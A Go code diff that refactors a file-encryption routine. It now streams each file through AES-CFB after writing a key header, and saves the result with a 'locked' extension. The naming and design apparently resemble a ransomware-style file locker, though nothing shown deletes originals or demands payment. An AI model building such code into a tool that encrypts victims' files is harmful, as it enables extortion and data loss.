@@ -2,7 +2,8 @@ package main
 
 import (
 	"crypto/rsa"
-	"io/ioutil"
+	"io"
+	"os"
 
 	"crypto/aes"
 	"crypto/rand"
@@ -13,11 +14,21 @@ import (
 )
 
 func encrypt(file string, priv *rsa.PrivateKey) {
-	data, err := ioutil.ReadFile(file)
+	inFile, err := os.Open(file)
 
 	if err != nil {
 		panic(err)
 	}
+
+	defer inFile.Close()
+
+	outFile, err := os.OpenFile(file+LockedExtension, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
+
+	if err != nil {
+		panic(err)
+	}
+
+	defer outFile.Close()
 
 	key := make([]byte, KeySize)
 	rand.Read(key)
@@ -35,16 +46,23 @@ func encrypt(file string, priv *rsa.PrivateKey) {
 		panic(err)
 	}
 
+	_, err = outFile.Write(header)
+
+	if err != nil {
+		panic(err)
+	}
+
 	block, err := aes.NewCipher(key)
 
 	if err != nil {
 		panic(err)
 	}
 
-	cipher := cipher.NewCFBEncrypter(block, iv)
-	cipher.XORKeyStream(data, data)
+	stream := cipher.NewCFBEncrypter(block, iv)
+	reader := &cipher.StreamReader{S: stream, R: inFile}
 
-	data = append(header, data...)
-
-	ioutil.WriteFile(file+LockedExtension, data, 0777)
+	_, err = io.Copy(outFile, reader)
+	if err != nil {
+		panic(err)
+	}
 }
